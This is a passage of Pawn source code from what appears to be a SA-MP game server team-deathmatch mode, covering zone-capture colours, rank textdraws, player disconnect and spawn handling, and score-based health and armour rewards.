	else if(tCP[BATTLESHIP] == TEAM_ML) GangZoneShowForAll(Zone[BATTLESHIP], TEAM_ZONE_ML_COLOR);
	else if(tCP[BATTLESHIP] == TEAM_PAKISTAN) GangZoneShowForAll(Zone[BATTLESHIP], TEAM_ZONE_PAKISTAN_COLOR);
	else if(tCP[BATTLESHIP] == TEAM_INDIA) GangZoneShowForAll(Zone[BATTLESHIP], TEAM_ZONE_INDIA_COLOR);
	else if(tCP[BATTLESHIP] == TEAM_USA) GangZoneShowForAll(Zone[BATTLESHIP], TEAM_ZONE_USA_COLOR);
	else if(tCP[BATTLESHIP] == TEAM_NEPAL) GangZoneShowForAll(Zone[BATTLESHIP], TEAM_ZONE_NEPAL_COLOR);
	else if(tCP[BATTLESHIP] == TEAM_CHINA) GangZoneShowForAll(Zone[BATTLESHIP], TEAM_ZONE_CHINA_COLOR);
    //-----
	return 1;
}
forward UpdateTextdraw(playerid);
public UpdateTextdraw(playerid)
{
   if(gTeam[playerid] == TEAM_PAKISTAN)
   {
      new string[150];
   	  format(string, sizeof(string),"~r~%s", GetRankName(playerid));
   	  TextDrawSetString(TeamText[playerid], string);
   }
   if(gTeam[playerid] == TEAM_CHINA)
   {
      new string[150];
   	  format(string, sizeof(string),"~r~%s", GetRankName(playerid));
   	  TextDrawSetString(TeamText[playerid], string);
   }
   if(gTeam[playerid] == TEAM_INDIA)
   {
      new string[150];
   	  format(string, sizeof(string),"~r~%s", GetRankName(playerid));
   	  TextDrawSetString(TeamText[playerid], string);
   }
   if(gTeam[playerid] == TEAM_NEPAL)
   {
      new string[150];
   	  format(string, sizeof(string),"~r~%s", GetRankName(playerid));
   	  TextDrawSetString(TeamText[playerid], string);
   }
   if(gTeam[playerid] == TEAM_USA)
   {
      new string[150];
   	  format(string, sizeof(string),"~r~%s", GetRankName(playerid));
   	  TextDrawSetString(TeamText[playerid], string);
   }
   if(gTeam[playerid] == TEAM_DUBAI)
   {
      new string[150];
   	  format(string, sizeof(string),"~r~%s", GetRankName(playerid));
   	  TextDrawSetString(TeamText[playerid], string);
   }
   if(gTeam[playerid] == TEAM_ML)
   {
      new string[150];
   	  format(string, sizeof(string),"~r~%s", GetRankName(playerid));
   	  TextDrawSetString(TeamText[playerid], string);
   }
   if(gTeam[playerid] == TEAM_NONE)
   {
   	  TextDrawSetString(TeamText[playerid], "~p~OnDuty - Admin");
   }

}
public UpdateLabelText(playerid)
{
   new string[120];
   format(string, sizeof(string),"%s - %s\n %s",GetRankName(playerid), GetTeamName(playerid), GetClass(playerid));
   if(gTeam[playerid] == TEAM_PAKISTAN)
   {
        Update3DTextLabelText(RankLabel[playerid], 0xFFFFFFFF, " ");
		Update3DTextLabelText(RankLabel[playerid], TEAM_PAKISTAN_COLOR, string);
   }
   if(gTeam[playerid] == TEAM_CHINA)
   {
        Update3DTextLabelText(RankLabel[playerid], 0xFFFFFFFF, " ");
		Update3DTextLabelText(RankLabel[playerid], TEAM_CHINA_COLOR, string);
   }
   if(gTeam[playerid] == TEAM_NEPAL)
   {
        Update3DTextLabelText(RankLabel[playerid], 0xFFFFFFFF, " ");
		Update3DTextLabelText(RankLabel[playerid], TEAM_NEPAL_COLOR, string);
   }
   if(gTeam[playerid] == TEAM_INDIA)
   {
        Update3DTextLabelText(RankLabel[playerid], 0xFFFFFFFF, " ");
		Update3DTextLabelText(RankLabel[playerid], TEAM_INDIA_COLOR, string);
   }
   if(gTeam[playerid] == TEAM_USA)
   {
        Update3DTextLabelText(RankLabel[playerid], 0xFFFFFFFF, " ");
		Update3DTextLabelText(RankLabel[playerid], TEAM_USA_COLOR, string);
   }
   if(gTeam[playerid] == TEAM_DUBAI)
   {
        Update3DTextLabelText(RankLabel[playerid], 0xFFFFFFFF, " ");
		Update3DTextLabelText(RankLabel[playerid], TEAM_DUBAI_COLOR, string);
   }
   if(gTeam[playerid] == TEAM_ML)
   {
        Update3DTextLabelText(RankLabel[playerid], 0xFFFFFFFF, " ");
		Update3DTextLabelText(RankLabel[playerid], TEAM_ML_COLOR, string);
   }
   if(gTeam[playerid] == TEAM_NONE)
   {
        Update3DTextLabelText(RankLabel[playerid], 0xFFFFFFFF, " ");
   }
   return 1;
}
public OnPlayerDisconnect(playerid, reason)
{
    if(DuelActive == true && Dueling[playerid] == true)
    {
    DuelActive = false;
    Dueling[Duelist[playerid]] = false;
    Duelist[Duelist[playerid]] = -1;
    WinningPrice = 0;
	}
    format(MessageStrl6, 170, MessageStrl5);
	format(MessageStrl5, 170, MessageStrl4);
    format(MessageStrl4, 170, MessageStrl3);
    format(MessageStrl3, 170, MessageStrl2);
    format(MessageStrl2, 170, MessageStr);
    new name[MAX_PLAYER_NAME+1];
    GetPlayerName(playerid, name, sizeof(name)); // getting the player name
    switch(reason) //switching reasons
    {
            case 0: format(MessageStr,sizeof MessageStr,"~r~[LEFT]~w~%s(~r~%d~w~) has ~r~left ~w~the server.", name, playerid);
            case 1: format(MessageStr,sizeof MessageStr,"~r~[LEFT]~w~%s(~r~%d~w~) was ~r~timeout.", name, playerid);
            case 2: format(MessageStr,sizeof MessageStr,"~r~[LEFT]~w~%s(~r~%d~w~) was ~r~kicked/banned.", name, playerid);
    }
    new STR[510]; //creating a new string to merge the 3 strings into a one 3 lines string
    format(STR, sizeof(STR), "%s~n~%s~n~%s~n~%s~n~%s~n~%s", MessageStrl6,MessageStrl5,MessageStrl4,MessageStrl3, MessageStrl2, MessageStr); //formatting the newly created string
    TextDrawSetString(Message, STR); //showing it on the screen

    TextDrawHideForPlayer(playerid, TeamText[playerid]);
    TextDrawSetString(TeamText[playerid]," ");
    TextDrawHideForPlayer(playerid, Rank1[playerid]);
    TextDrawHideForPlayer(playerid, CountText[playerid]);
	Streak[playerid] = 0;
	rconAttempts[playerid] = 0;
	LastPm[playerid] = -1;
	Update3DTextLabelText(RankLabel[playerid], 0xFFFFFFFF, " ");
	TextDrawHideForPlayer(playerid, Web);
    TextDrawHideForPlayer(playerid, A);
    TextDrawHideForPlayer(playerid, A2);
    TextDrawHideForPlayer(playerid, Tur);
    TextDrawHideForPlayer(playerid, ML);
    TextDrawHideForPlayer(playerid, U);
    TextDrawHideForPlayer(playerid, S);
    TextDrawHideForPlayer(playerid, StartLogo);
    /*TextDrawHideForPlayer(playerid, startbox);
    TextDrawHideForPlayer(playerid, welcome);
    TextDrawHideForPlayer(playerid, to);
    TextDrawHideForPlayer(playerid, advance);
    TextDrawHideForPlayer(playerid, copyright);*/
	//-----------------------------------------------------
	UpdateTimer[playerid] = KillTimer(UpdateTimer[playerid]);
	SetPVarInt(playerid,"LastID",-1);
	new PlayerName[MAX_PLAYER_NAME];
	GetPlayerName(playerid, PlayerName, sizeof(PlayerName));

	if(PlayerInfo[playerid][LoggedIn] == 1)	SavePlayer(playerid);
	if(udb_Exists(PlayerName2(playerid))) dUserSetINT(PlayerName2(playerid)).("loggedin",0);
  	PlayerInfo[playerid][LoggedIn] = 0;
	PlayerInfo[playerid][Level] = 0;
	PlayerInfo[playerid][Jailed] = 0;
	PlayerInfo[playerid][Frozen] = 0;

	if(PlayerInfo[playerid][Jailed] == 1) KillTimer( JailTimer[playerid] );
	if(PlayerInfo[playerid][Frozen] == 1) KillTimer( FreezeTimer[playerid] );
	if(ServerInfo[Locked] == 1)	KillTimer( LockKickTimer[playerid] );
	if(PlayerInfo[playerid][pCar] != -1) CarDeleter(PlayerInfo[playerid][pCar]);
	//==========================================================================
	if(Captured[playerid][SNAKE] == 0 && IsPlayerCapturing[playerid][SNAKE] == 1)
    {
		LeavingSnakeFarm(playerid);
	}
	if(Captured[playerid][BAY] == 0 && IsPlayerCapturing[playerid][BAY] == 1)
    {
		LeavingBay(playerid);
	}
	if(Captured[playerid][BIG] == 0 && IsPlayerCapturing[playerid][BIG] == 1)
	{
		LeavingEar(playerid);
	}
	if(Captured[playerid][ARMY] == 0 && IsPlayerCapturing[playerid][ARMY] == 1)
	{
		LeavingArmy(playerid);
	}
	if(Captured[playerid][PETROL] == 0 && IsPlayerCapturing[playerid][PETROL] == 1)
	{
		LeavingPetrol(playerid);
	}
	if(Captured[playerid][OIL] == 0 && IsPlayerCapturing[playerid][OIL] == 1)
	{
		LeavingOil(playerid);
	}
	if(Captured[playerid][DESERT] == 0 && IsPlayerCapturing[playerid][DESERT] == 1)
	{
		LeavingDesert(playerid);
	}
	if(Captured[playerid][QUARRY] == 0 && IsPlayerCapturing[playerid][QUARRY] == 1)
	{
		LeavingQuarry(playerid);
	}
	if(Captured[playerid][GUEST] == 0 && IsPlayerCapturing[playerid][GUEST] == 1)
	{
		LeavingGuest(playerid);
	}
	if(Captured[playerid][EAR] == 0 && IsPlayerCapturing[playerid][EAR] == 1)
	{
		LeavingEar(playerid);
	}
	if(Captured[playerid][AIRPORT] == 0 && IsPlayerCapturing[playerid][AIRPORT] == 1)
	{
		LeavingAirport(playerid);
	}
	if(Captured[playerid][SHIP] == 0 && IsPlayerCapturing[playerid][SHIP] == 1)
	{
		LeavingShip(playerid);
	}
	if(Captured[playerid][GAS] == 0 && IsPlayerCapturing[playerid][GAS] == 1)
	{
		LeavingGas(playerid);
	}
	if(Captured[playerid][RES] == 0 && IsPlayerCapturing[playerid][RES] == 1)
	{
		LeavingRes(playerid);
	}
	/*if(Captured[playerid][NPP] == 0 && IsPlayerCapturing[playerid][NPP] == 1)
	{
		LeavingNuclear(playerid);
	}*/
	if(Captured[playerid][MOTEL] == 0 && IsPlayerCapturing[playerid][MOTEL] == 1)
	{
		LeavingMOTEL(playerid);
	}
	if(Captured[playerid][BATTLESHIP] == 0 && IsPlayerCapturing[playerid][BATTLESHIP] == 1)
	{
		LeavingBattleShip(playerid);
	}
	if(Captured[playerid][HOSPITAL] == 0 && IsPlayerCapturing[playerid][HOSPITAL] == 1)
	{
		LeavingHospital(playerid);
	}
	//==========================================================================
	#if defined ENABLE_SPEC
	for(new x=0; x<MAX_PLAYERS; x++)
	    if(GetPlayerState(x) == PLAYER_STATE_SPECTATING && PlayerInfo[x][SpecID] == playerid)
   		   	AdvanceSpectate(x);
	#endif
	return 1;
}

public OnPlayerSpawn(playerid)
{
	SetPlayerHealth(playerid, 99999.0);
	SetTimerEx("SpawnProtection", 10000, false, "i", playerid);
	TextDrawShowForPlayer(playerid, mbox);
    TextDrawShowForPlayer(playerid, Message);
	SendClientMessage(playerid, red, "*Anti-Spawn kill protection for 10 seconds!");
	AntiSK[playerid] = 1;
	SetPlayerVirtualWorld(playerid, 0);
	SetPlayerInterior(playerid, 0);
	ResetPlayerWeapons(playerid);
	UpdateLabelText(playerid);
	TextDrawShowForPlayer(playerid, TeamText[playerid]);
	TextDrawHideForPlayer(playerid, CountText[playerid]);
	UpdateTextdraw(playerid);

	if(FirstSpawn[playerid] == 1)
	{
		SendClientMessage(playerid, -1,"Please select your class");
		FirstSpawn[playerid] = 0;
      ShowPlayerDialog(playerid, CLASS_DIALOG, DIALOG_STYLE_LIST,"Class Selection",""cred"Soldier - "cgreen"Rank 0\n"cred"Sniper - "cgreen"Rank 2\n"cred"Pilot - "cgreen"Rank 6\n"cred"Engineer - "cgreen"Rank 5\n"cred"Support - "cgreen"Rank 7\n"cred"Scout - "cgreen"Rank 5","Select","");
	}
	if(gTeam[playerid] == TEAM_PAKISTAN)
	{
	   new rand = random(sizeof(PakistanSpawn));
	   SetPlayerPos(playerid, PakistanSpawn[rand][0], PakistanSpawn[rand][1], PakistanSpawn[rand][2]);
	}
	else if(gTeam[playerid] == TEAM_CHINA)
	{
       new rand = random(sizeof(ChinaSpawn));
	   SetPlayerPos(playerid, ChinaSpawn[rand][0], ChinaSpawn[rand][1], ChinaSpawn[rand][2]);
	}
	else if(gTeam[playerid] == TEAM_INDIA)
	{
       new rand = random(sizeof(IndiaSpawn));
	   SetPlayerPos(playerid, IndiaSpawn[rand][0], IndiaSpawn[rand][1], IndiaSpawn[rand][2]);
	}
	else if(gTeam[playerid] == TEAM_NEPAL)
	{
       new rand = random(sizeof(NepalSpawn));
	   SetPlayerPos(playerid, NepalSpawn[rand][0], NepalSpawn[rand][1], NepalSpawn[rand][2]);
	}
	else if(gTeam[playerid] == TEAM_USA)
	{
       new rand = random(sizeof(USSpawn));
	   SetPlayerPos(playerid, USSpawn[rand][0], USSpawn[rand][1], USSpawn[rand][2]);
	}
	else if(gTeam[playerid] == TEAM_DUBAI)
	{
       new rand = random(sizeof(DubaiSpawn));
	   SetPlayerPos(playerid, DubaiSpawn[rand][0], DubaiSpawn[rand][1], DubaiSpawn[rand][2]);
	}
	else if(gTeam[playerid] == TEAM_ML)
	{
       new rand = random(sizeof(MLSpawn));
	   SetPlayerPos(playerid, MLSpawn[rand][0], MLSpawn[rand][1], MLSpawn[rand][2]);
	}
	if(Captured[playerid][SNAKE] == 0 && IsPlayerCapturing[playerid][SNAKE] == 1)
    {
		LeavingSnakeFarm(playerid);
	}
	if(Captured[playerid][BAY] == 0 && IsPlayerCapturing[playerid][BAY] == 1)
    {
		LeavingBay(playerid);
	}
	if(Captured[playerid][BIG] == 0 && IsPlayerCapturing[playerid][BIG] == 1)
	{
		LeavingEar(playerid);
	}
	if(Captured[playerid][ARMY] == 0 && IsPlayerCapturing[playerid][ARMY] == 1)
	{
		LeavingArmy(playerid);
	}
	if(Captured[playerid][PETROL] == 0 && IsPlayerCapturing[playerid][PETROL] == 1)
	{
		LeavingPetrol(playerid);
	}
	if(Captured[playerid][OIL] == 0 && IsPlayerCapturing[playerid][OIL] == 1)
	{
		LeavingOil(playerid);
	}
	if(Captured[playerid][DESERT] == 0 && IsPlayerCapturing[playerid][DESERT] == 1)
	{
		LeavingDesert(playerid);
	}
	if(Captured[playerid][QUARRY] == 0 && IsPlayerCapturing[playerid][QUARRY] == 1)
	{
		LeavingQuarry(playerid);
	}
	if(Captured[playerid][GUEST] == 0 && IsPlayerCapturing[playerid][GUEST] == 1)
	{
		LeavingGuest(playerid);
	}
	if(Captured[playerid][EAR] == 0 && IsPlayerCapturing[playerid][EAR] == 1)
	{
		LeavingEar(playerid);
	}
	if(Captured[playerid][AIRPORT] == 0 && IsPlayerCapturing[playerid][AIRPORT] == 1)
	{
		LeavingAirport(playerid);
	}
	if(Captured[playerid][SHIP] == 0 && IsPlayerCapturing[playerid][SHIP] == 1)
	{
		LeavingShip(playerid);
	}
	if(Captured[playerid][GAS] == 0 && IsPlayerCapturing[playerid][GAS] == 1)
	{
		LeavingGas(playerid);
	}
	if(Captured[playerid][RES] == 0 && IsPlayerCapturing[playerid][RES] == 1)
	{
		LeavingRes(playerid);
	}
	/*if(Captured[playerid][NPP] == 0 && IsPlayerCapturing[playerid][NPP] == 1)
	{
		LeavingNuclear(playerid);
	}*/
	if(Captured[playerid][MOTEL] == 0 && IsPlayerCapturing[playerid][MOTEL] == 1)
	{
		LeavingMOTEL(playerid);
	}
	if(Captured[playerid][BATTLESHIP] == 0 && IsPlayerCapturing[playerid][BATTLESHIP] == 1)
	{
		LeavingBattleShip(playerid);
	}
	if(Captured[playerid][HOSPITAL] == 0 && IsPlayerCapturing[playerid][HOSPITAL] == 1)
	{
		LeavingHospital(playerid);
	}
	TextDrawShowForPlayer(playerid, Rank1[playerid]);
	new str[100];
	format(str, sizeof(str),"~y~RANK: ~w~%s - ~y~SCORE: ~w~%d~n~~g~KILLS: ~w~%d - ~r~DEATHS: ~w~%d", GetRankName(playerid),GetPlayerScore(playerid),PlayerInfo[playerid][Kills], PlayerInfo[playerid][Deaths]);
	TextDrawSetString(Rank1[playerid], str);
	if(GetPlayerScore(playerid) >= 0 && GetPlayerScore(playerid) <= 99)
	{
	TextDrawShowForPlayer(playerid, Star[0]);
	TextDrawHideForPlayer(playerid, Star[1]);
	TextDrawHideForPlayer(playerid, Star[2]);
	TextDrawHideForPlayer(playerid, Star[3]);
	TextDrawHideForPlayer(playerid, Star[4]);
	TextDrawHideForPlayer(playerid, Star[5]);
	TextDrawHideForPlayer(playerid, Star[6]);
	TextDrawHideForPlayer(playerid, Star[7]);
	TextDrawHideForPlayer(playerid, Star[8]);
	TextDrawHideForPlayer(playerid, Star[9]);
	}
	else if(GetPlayerScore(playerid) >= 100 && GetPlayerScore(playerid) <= 299)
	{
	TextDrawShowForPlayer(playerid, Star[0]);
	TextDrawShowForPlayer(playerid, Star[1]);
	TextDrawHideForPlayer(playerid, Star[2]);
	TextDrawHideForPlayer(playerid, Star[3]);
	TextDrawHideForPlayer(playerid, Star[4]);
	TextDrawHideForPlayer(playerid, Star[5]);
	TextDrawHideForPlayer(playerid, Star[6]);
	TextDrawHideForPlayer(playerid, Star[7]);
	TextDrawHideForPlayer(playerid, Star[8]);
	TextDrawHideForPlayer(playerid, Star[9]);
	}
	else if(GetPlayerScore(playerid) >= 300 && GetPlayerScore(playerid) <= 499)
	{
	TextDrawShowForPlayer(playerid, Star[0]);
	TextDrawShowForPlayer(playerid, Star[1]);
	TextDrawShowForPlayer(playerid, Star[2]);
	TextDrawHideForPlayer(playerid, Star[3]);
	TextDrawHideForPlayer(playerid, Star[4]);
	TextDrawHideForPlayer(playerid, Star[5]);
	TextDrawHideForPlayer(playerid, Star[6]);
	TextDrawHideForPlayer(playerid, Star[7]);
	TextDrawHideForPlayer(playerid, Star[8]);
	TextDrawHideForPlayer(playerid, Star[9]);
	}
	else if(GetPlayerScore(playerid) >= 500 && GetPlayerScore(playerid) <= 999)
	{
	TextDrawShowForPlayer(playerid, Star[0]);
	TextDrawShowForPlayer(playerid, Star[1]);
	TextDrawShowForPlayer(playerid, Star[2]);
	TextDrawShowForPlayer(playerid, Star[3]);
	TextDrawHideForPlayer(playerid, Star[4]);
	TextDrawHideForPlayer(playerid, Star[5]);
	TextDrawHideForPlayer(playerid, Star[6]);
	TextDrawHideForPlayer(playerid, Star[7]);
	TextDrawHideForPlayer(playerid, Star[8]);
	TextDrawHideForPlayer(playerid, Star[9]);
	}
	else if(GetPlayerScore(playerid) >= 1000 && GetPlayerScore(playerid) <= 1499)
	{
	TextDrawShowForPlayer(playerid, Star[0]);
	TextDrawShowForPlayer(playerid, Star[1]);
	TextDrawShowForPlayer(playerid, Star[2]);
	TextDrawShowForPlayer(playerid, Star[3]);
	TextDrawShowForPlayer(playerid, Star[4]);
	TextDrawHideForPlayer(playerid, Star[5]);
	TextDrawHideForPlayer(playerid, Star[6]);
	TextDrawHideForPlayer(playerid, Star[7]);
	TextDrawHideForPlayer(playerid, Star[8]);
	TextDrawHideForPlayer(playerid, Star[9]);
	}
	else if(GetPlayerScore(playerid) >= 1500 && GetPlayerScore(playerid) <= 1999)
	{
	TextDrawShowForPlayer(playerid, Star[0]);
	TextDrawShowForPlayer(playerid, Star[1]);
	TextDrawShowForPlayer(playerid, Star[2]);
	TextDrawShowForPlayer(playerid, Star[3]);
	TextDrawShowForPlayer(playerid, Star[4]);
	TextDrawShowForPlayer(playerid, Star[5]);
	TextDrawHideForPlayer(playerid, Star[6]);
	TextDrawHideForPlayer(playerid, Star[7]);
	TextDrawHideForPlayer(playerid, Star[8]);
	TextDrawHideForPlayer(playerid, Star[9]);
	TextDrawShowForPlayer(playerid, Rank1[playerid]);
	}
	else if(GetPlayerScore(playerid) >= 2000 && GetPlayerScore(playerid) <= 2499)
	{
	TextDrawShowForPlayer(playerid, Star[0]);
	TextDrawShowForPlayer(playerid, Star[1]);
	TextDrawShowForPlayer(playerid, Star[2]);
	TextDrawShowForPlayer(playerid, Star[3]);
	TextDrawShowForPlayer(playerid, Star[4]);
	TextDrawShowForPlayer(playerid, Star[5]);
	TextDrawShowForPlayer(playerid, Star[6]);
	TextDrawHideForPlayer(playerid, Star[7]);
	TextDrawHideForPlayer(playerid, Star[8]);
	TextDrawHideForPlayer(playerid, Star[9]);
	}
	else if(GetPlayerScore(playerid) >= 2500 && GetPlayerScore(playerid) <= 4999)
	{
	TextDrawShowForPlayer(playerid, Star[0]);
	TextDrawShowForPlayer(playerid, Star[1]);
	TextDrawShowForPlayer(playerid, Star[2]);
	TextDrawShowForPlayer(playerid, Star[3]);
	TextDrawShowForPlayer(playerid, Star[4]);
	TextDrawShowForPlayer(playerid, Star[5]);
	TextDrawShowForPlayer(playerid, Star[6]);
	TextDrawShowForPlayer(playerid, Star[7]);
	TextDrawHideForPlayer(playerid, Star[8]);
	TextDrawHideForPlayer(playerid, Star[9]);
	}
	else if(GetPlayerScore(playerid) >= 5000 && GetPlayerScore(playerid) <= 9999)
	{
	TextDrawShowForPlayer(playerid, Star[0]);
	TextDrawShowForPlayer(playerid, Star[1]);
	TextDrawShowForPlayer(playerid, Star[2]);
	TextDrawShowForPlayer(playerid, Star[3]);
	TextDrawShowForPlayer(playerid, Star[4]);
	TextDrawShowForPlayer(playerid, Star[5]);
	TextDrawShowForPlayer(playerid, Star[6]);
	TextDrawShowForPlayer(playerid, Star[7]);
	TextDrawShowForPlayer(playerid, Star[8]);
	TextDrawHideForPlayer(playerid, Star[9]);
	}
	else if(GetPlayerScore(playerid) >= 10000)
	{
	TextDrawShowForPlayer(playerid, Star[0]);
	TextDrawShowForPlayer(playerid, Star[1]);
	TextDrawShowForPlayer(playerid, Star[2]);
	TextDrawShowForPlayer(playerid, Star[3]);
	TextDrawShowForPlayer(playerid, Star[4]);
	TextDrawShowForPlayer(playerid, Star[5]);
	TextDrawShowForPlayer(playerid, Star[6]);
	TextDrawShowForPlayer(playerid, Star[7]);
	TextDrawShowForPlayer(playerid, Star[8]);
	TextDrawShowForPlayer(playerid, Star[9]);
	}

	if(gTeam[playerid] == TEAM_PAKISTAN)
	{
		SetPlayerTeam(playerid, TEAM_PAKISTAN);
		SetPlayerColor(playerid, TEAM_PAKISTAN_COLOR);
	}
	if(gTeam[playerid] == TEAM_INDIA)
	{
		SetPlayerTeam(playerid, TEAM_INDIA);
		SetPlayerColor(playerid, TEAM_INDIA_COLOR);
	}
	if(gTeam[playerid] == TEAM_CHINA)
	{
		SetPlayerTeam(playerid, TEAM_CHINA);
		SetPlayerColor(playerid, TEAM_CHINA_COLOR);
	}
	if(gTeam[playerid] == TEAM_USA)
	{
		SetPlayerTeam(playerid, TEAM_USA);
		SetPlayerColor(playerid, TEAM_USA_COLOR);
	}
	if(gTeam[playerid] == TEAM_NEPAL)
	{
		SetPlayerTeam(playerid, TEAM_NEPAL);
		SetPlayerColor(playerid, TEAM_NEPAL_COLOR);
	}
	if(gTeam[playerid] == TEAM_DUBAI)
	{
		SetPlayerTeam(playerid, TEAM_DUBAI);
		SetPlayerColor(playerid, TEAM_DUBAI_COLOR);
	}
	if(gTeam[playerid] == TEAM_ML)
	{
		SetPlayerTeam(playerid, TEAM_ML);
		SetPlayerColor(playerid, TEAM_ML_COLOR);
	}
    if(PlayerInfo[playerid][OnDuty] == 1)
	{
    SetPlayerHealth(playerid, 9999);
    SetPlayerColor(playerid, 0xF600F6FF);
    GivePlayerWeapon(playerid, 38, 9999);
    SetPlayerSkin(playerid, 217);
    }
	PlayerInfo[playerid][Spawned] = 1;

	if(PlayerInfo[playerid][Frozen] == 1) {
		TogglePlayerControllable(playerid,false); return SendClientMessage(playerid,red,"You cant escape your punishment. You Are Still Frozen");
	}

	if(PlayerInfo[playerid][Jailed] == 1) {
	    JailPlayer(playerid); return SendClientMessage(playerid,red,"You cant escape your punishment. You Are Still In Jail");
	}

	if(ServerInfo[AdminOnlySkins] == 1) {
		if( (GetPlayerSkin(playerid) == ServerInfo[AdminSkin]) || (GetPlayerSkin(playerid) == ServerInfo[AdminSkin2]) ) {
			if(PlayerInfo[playerid][Level] >= 1)
				GameTextForPlayer(playerid,"~b~Welcome~n~~w~Admin",3000,1);
			else {
				GameTextForPlayer(playerid,"~r~This Skin Is For~n~Administrators~n~Only",4000,1);
				//SetTimerEx("DelayKillPlayer", 2500,0,"d",playerid);
				return 1;
			}
		}
	}
	GangZoneShowForAll(GZ_ZONE1, TEAM_ZONE_USA_COLOR); //USA
	GangZoneShowForAll(GZ_ZONE3, TEAM_ZONE_NEPAL_COLOR); // Nepal
	GangZoneShowForAll(GZ_ZONE2, TEAM_ZONE_PAKISTAN_COLOR); //PAKISTAN
	GangZoneShowForAll(GZ_ZONE4, TEAM_ZONE_CHINA_COLOR); //CHINA
	GangZoneShowForAll(GZ_ZONE5, TEAM_ZONE_INDIA_COLOR); //INDIA
	GangZoneShowForAll(GZ_ZONE6, TEAM_ZONE_DUBAI_COLOR); //Dubai
	GangZoneShowForAll(GZ_ZONE7, TEAM_ZONE_ML_COLOR); //Malaysia


	SetPlayerMapIcon(playerid, 5, -36.5458, 2347.6426, 24.1406, 19,2,MAPICON_GLOBAL); //SNakes farm

	SetPlayerMapIcon(playerid, 6, 260.0900,2889.5242,11.1854, 19,2,MAPICON_GLOBAL); //Bay side

	SetPlayerMapIcon(playerid, 7, 239.5721,1859.1677,14.0840, 19,2,MAPICON_GLOBAL); //Area 69

	SetPlayerMapIcon(playerid, 8, -551.6992,2593.0771,53.9348, 19,2,MAPICON_GLOBAL); //Army MOTEL

	SetPlayerMapIcon(playerid, 9, 670.9215,1705.4658,7.1875, 19,2,MAPICON_GLOBAL); //Army petrol bunk

	SetPlayerMapIcon(playerid, 10, 221.0856,1422.6615,10.5859, 19,2,MAPICON_GLOBAL); //Oil Factory

	SetPlayerMapIcon(playerid, 11, 558.9932,1221.8896,11.7188, 19,2,MAPICON_GLOBAL); //Oil Station

	SetPlayerMapIcon(playerid, 12, 588.3246,875.7402,-42.4973, 19,2,MAPICON_GLOBAL); //Quarry

	SetPlayerMapIcon(playerid, 13, -314.8433,1773.9176,43.6406, 19,2,MAPICON_GLOBAL); //Desert Guest house

	SetPlayerMapIcon(playerid, 14, -311.0136,1542.9733,75.5625, 19,2,MAPICON_GLOBAL); //Big Ear

	SetPlayerMapIcon(playerid, 15, 408.1432,2450.1574,16.5, 19,2,MAPICON_GLOBAL); //Airport

	SetPlayerMapIcon(playerid, 16, -1377.5,1492.154,11.199999809265, 19,2,MAPICON_GLOBAL); //Ship

	SetPlayerMapIcon(playerid, 17, -1471.1574, 1863.4124, 32.599998474121, 19,2,MAPICON_GLOBAL); //Gas Station

	SetPlayerMapIcon(playerid, 18,-1208.154,1834.5,41.900001525879, 19,2,MAPICON_GLOBAL); //Restaurant

	//SetPlayerMapIcon(playerid, 19,1001.0014, 2669.4583, 14.7099, 19,2,MAPICON_GLOBAL); //NPP

	SetPlayerMapIcon(playerid, 20, 2216.8328,-1170.3940,25.7266, 19,2,MAPICON_GLOBAL); //Las

	SetPlayerMapIcon(playerid, 21,1047.0999755859,1012.12452,11.1, 19,2,MAPICON_GLOBAL); //MOTEL

	SetPlayerMapIcon(playerid, 22,-2472.7742, 1548.9401, 33.2473, 19,2,MAPICON_GLOBAL); //BATTLESHIP
	
	SetPlayerMapIcon(playerid, 23,-685.4737,939.6329,13.6328, 23,2,MAPICON_GLOBAL); //Pak
	
	SetPlayerMapIcon(playerid, 24,-797.5327,1556.2026,27.1244, 23,2,MAPICON_GLOBAL); //India
	
	SetPlayerMapIcon(playerid, 25,-148.4453,1110.0249,19.7500, 23,2,MAPICON_GLOBAL); //China
	
	SetPlayerMapIcon(playerid, 26,-1489.2524, 2545.7410, 56.4080, 23,2,MAPICON_GLOBAL); //Nepal
	
	SetPlayerMapIcon(playerid, 27,-252.4021,2603.1230,62.8582, 23,2,MAPICON_GLOBAL); //USA
	
	SetPlayerMapIcon(playerid, 28,1099.6589, 2274.6606, 10.6414, 23,2,MAPICON_GLOBAL); //Dubai
	
	SetPlayerMapIcon(playerid, 29,1161.3423, 1333.2971, 11.2033, 23,2,MAPICON_GLOBAL); //Malaysia
	

	TextDrawHideForPlayer(playerid, E);
	TextDrawHideForPlayer(playerid, A);
	TextDrawHideForPlayer(playerid, S);
	TextDrawHideForPlayer(playerid, U);
	TextDrawHideForPlayer(playerid, A2);
	TextDrawHideForPlayer(playerid, Tur);
	TextDrawHideForPlayer(playerid, ML);
	TextDrawShowForPlayer(playerid, Web);
	return 1;
}

forward SpawnProtection(playerid);
public SpawnProtection(playerid)
{
    SendClientMessage(playerid, red,"*Anti-Spawn kill protection ended!");
	AntiSK[playerid] = 0;
	TogglePlayerControllable(playerid, true);
	SendClientMessage(playerid, -1,"You are ready to go now.");
	GivePlayerWeapons(playerid);
	if (GetPlayerScore(playerid) >= 0 && GetPlayerScore(playerid) <= 99)
    {
	   SetPlayerHealth( playerid, 75 );
	}
	if (GetPlayerScore(playerid) >= 100 && GetPlayerScore(playerid) <= 299)
	{
		SetPlayerHealth(playerid, 95);
	}
	if (GetPlayerScore(playerid) >= 300 && GetPlayerScore(playerid) <= 499)
	{
		SetPlayerHealth(playerid, 100);
	}
    if (GetPlayerScore(playerid) >= 500 && GetPlayerScore(playerid) <= 999)
	{
		SetPlayerHealth(playerid, 100);
		SetPlayerArmour(playerid, 5);
	}
	if (GetPlayerScore(playerid) >= 1000 && GetPlayerScore(playerid) <= 1499)
	{
		SetPlayerHealth(playerid, 100);
		SetPlayerArmour(playerid, 15);
	}
	if (GetPlayerScore(playerid) >= 1500 && GetPlayerScore(playerid) <= 1999)
	{
		SetPlayerHealth(playerid, 100);
		SetPlayerArmour(playerid, 30);
	}
	if (GetPlayerScore(playerid) >= 2000 && GetPlayerScore(playerid) <= 2499)
	{
		SetPlayerHealth(playerid, 100);
		SetPlayerArmour(playerid, 40);
	}
	if (GetPlayerScore(playerid) >= 2500 && GetPlayerScore(playerid) <= 4999)
	{
		SetPlayerHealth(playerid, 100);
		SetPlayerArmour(playerid, 50);
	}
	if (GetPlayerScore(playerid) >= 5000 && GetPlayerScore(playerid) <= 9999)
	{
		SetPlayerHealth(playerid, 100);
		SetPlayerArmour(playerid, 75);
	}
	if (GetPlayerScore(playerid) >= 10000)
	{
		SetPlayerHealth(playerid, 100);
